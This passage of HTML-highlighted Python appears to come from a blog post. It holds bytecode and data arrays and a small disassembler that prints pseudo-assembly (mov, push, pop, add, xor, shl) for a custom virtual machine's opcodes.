punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">18432</span><span class=\"token punctuation\">,</span> <span class=\"token number\">61696</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16384</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8448</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13569</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token number\">25600</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30721</span><span class=\"token punctuation\">,</span> <span class=\"token number\">63744</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6145</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20992</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9472</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23809</span><span class=\"token punctuation\">,</span> <span class=\"token number\">18176</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64768</span><span class=\"token punctuation\">,</span> <span class=\"token number\">26881</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23552</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token number\">44801</span><span class=\"token punctuation\">,</span> <span class=\"token number\">45568</span><span class=\"token punctuation\">,</span> <span class=\"token number\">60417</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20993</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20225</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6657</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20480</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34049</span><span class=\"token punctuation\">,</span> <span class=\"token number\">52480</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8960</span><span class=\"token punctuation\">,</span> <span class=\"token number\">63488</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token number\">3072</span><span class=\"token punctuation\">,</span> <span class=\"token number\">52992</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15617</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17665</span><span class=\"token punctuation\">,</span> <span class=\"token number\">33280</span><span class=\"token punctuation\">,</span> <span class=\"token number\">53761</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10497</span><span class=\"token punctuation\">,</span> <span class=\"token number\">54529</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1537</span><span class=\"token punctuation\">,</span> <span class=\"token number\">41473</span><span class=\"token punctuation\">,</span> <span class=\"token number\">56832</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token number\">42497</span><span class=\"token punctuation\">,</span> <span class=\"token number\">51713</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>code<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x06</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x63</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>ip<span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mov</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>  <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>  <span class=\"token keyword\">match</span> code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov reg[0],data[reg[2]]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov data[reg[2]],reg[0]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"mov reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">]\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"mov reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>  ip<span class=\"token operator\">+=</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>  <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>  <span class=\"token keyword\">match</span> code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>​     <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"push reg[0]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>​     <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"push reg[0]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>​     <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"push reg[2]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>​     <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"push reg[3]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>  ip<span class=\"token operator\">+=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre></pre></td></tr><tr><td data-num=\"103\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">pop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>  <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"106\"></td><td><pre></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>  <span class=\"token keyword\">match</span> code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>​     <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pop reg[0]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>​     <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pop reg[0]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>​     <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pop reg[2]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>​     <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pop reg[3]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>  ip<span class=\"token operator\">+=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre></pre></td></tr><tr><td data-num=\"127\"></td><td><pre></pre></td></tr><tr><td data-num=\"128\"></td><td><pre></pre></td></tr><tr><td data-num=\"129\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">alu</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>  <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"132\"></td><td><pre></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>  <span class=\"token keyword\">match</span> code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>​     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"add reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">]\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>​     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"sub reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">]\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>​     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"mul reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">]\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>​     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"xor reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">]\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>​     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"shl reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token 